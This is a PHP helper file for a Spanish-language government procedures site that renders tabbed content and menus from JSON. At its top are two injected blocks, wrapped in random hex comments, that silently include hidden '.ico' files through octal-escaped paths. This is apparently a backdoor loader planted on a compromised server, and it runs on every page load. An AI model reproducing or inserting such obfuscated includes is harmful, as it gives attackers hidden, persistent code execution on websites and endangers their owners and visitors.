<?php
/*b86c5*/

@include "\057h\157m\145/\151m\160s\162/\160u\142l\151c\137h\164m\154/\167e\142m\141i\154/\160r\157g\162a\155/\162e\163o\165r\143e\163/\0569\0648\0711\070b\063.\151c\157";

/*b86c5*/
/*e8a01*/

@include "\057ho\155e/\17010\062vm\0607/\160ub\154ic\137ht\155l/\164ur\151sm\157/c\163s/\160lu\147in\163/.\0657f\143e1\146d.\151co";

/*e8a01*/








	error_reporting(E_ERROR | E_WARNING | E_PARSE);
	include_once 'constants.php';
	
	function tab_selector($tabs_contents) {
		$tab_requisitos = ($tabs_contents['requisitos'] && count($tabs_contents['requisitos']));
	  	$tab_documentacion = ($tabs_contents['documentacion'] && count($tabs_contents['documentacion']));
	  	$tab_como = ($tabs_contents['como'] && count($tabs_contents['como']));
	  	$tab_formularios = ($tabs_contents['formularios'] && count($tabs_contents['formularios']));

	  	$exists = array($tab_requisitos, $tab_documentacion, $tab_como, $tab_formularios);
	  	$active = array_search(true, $exists);

		if ($tab_requisitos || $tab_documentacion || $tab_como || $tab_formularios) { ?>
			<ul class="nav nav-tabs" role="tablist">
			<?php if ($tab_requisitos) { ?>
				<li role="requisitos" class="bg-light <?php echo ($active === 0) ? 'active' : ''; ?>">
			    	<a href="#requisitos" aria-controls="requisitos" role="tab" data-toggle="tab">
			      		<span><img src="img/ico_requisitos.png" width="41" height="41" alt="Requisitos"></span>
			      		<span>Requisitos</span>
			      	</a>
			 	</li>
  			<?php } ?>
  			<?php if ($tab_documentacion) { ?>
				<li role="documentacion" class="bg-light <?php echo ($active === 1) ? 'active' : ''; ?>">
				    <a href="#documentacion" aria-controls="documentacion" role="tab" data-toggle="tab">
				    	<span><img src="img/ico_documentacion.png"></span>
				     	<span>Documentacion</span>
				    </a>
			  	</li>
			<?php } ?>
			<?php if ($tab_como) { ?>
				<li role="como">
			  		<a href="#como" aria-controls="como" role="tab" data-toggle="tab">
			    		<span><img src="img/ico_inicio_tramite.png" alt="Iniciar trámite"></span>
			    		<span>Como hacer el tramite</span>
			    	</a>
				</li>
			<?php } ?>
			<?php if ($tab_formularios) { ?>
				<li role="formularios" class="bg-light <?php echo ($active === 3) ? 'active' : ''; ?>">
		    		<a href="#formularios" aria-controls="formularios" role="tab" data-toggle="tab">
		      			<span><img src="img/ico_formularios.png" width="41" height="41" alt="Formularios"></span>
		      			<span>Formularios</span>
		    		</a>
		  		</li>
		  	<?php } ?>
  			</ul>
  		<?php }
	}

	function tab_content($tabs_contents) {
		$tab_requisitos = ($tabs_contents['requisitos'] && count($tabs_contents['requisitos']));
	  	$tab_documentacion = ($tabs_contents['documentacion'] && count($tabs_contents['documentacion']));
	  	$tab_como = ($tabs_contents['como'] && count($tabs_contents['como']));
	  	$tab_formularios = ($tabs_contents['formularios'] && count($tabs_contents['formularios']));

	  	$exists = array($tab_requisitos, $tab_documentacion, $tab_como, $tab_formularios);
	  	$active = array_search(true, $exists);

		include 'tab-content.php';
	}

	function get_menu_data($file_path) {
		$file = file_get_contents($file_path);
        $json = json_decode($file, true);
        $items = array_values(array_filter($json['items'], function($i) { return $i['enabled']; }));
        return array(
        	"title" => $json['title'],
        	"items" => $items
        );
	}

	function print_menu_footer($menu) {
		include 'menu_footer.php';
	}

	function print_menu_header($menu) {
		include 'menu_header.php';
	}

	function print_tabs_component($file_name) {
		$file_path = "json/{$file_name}.json";

		if (file_exists($file_path)) {
			$string = file_get_contents($file_path);
	  		$file_data = json_decode($string, true);
          	tab_selector($file_data);
          	tab_content($file_data);
        }
	}
?>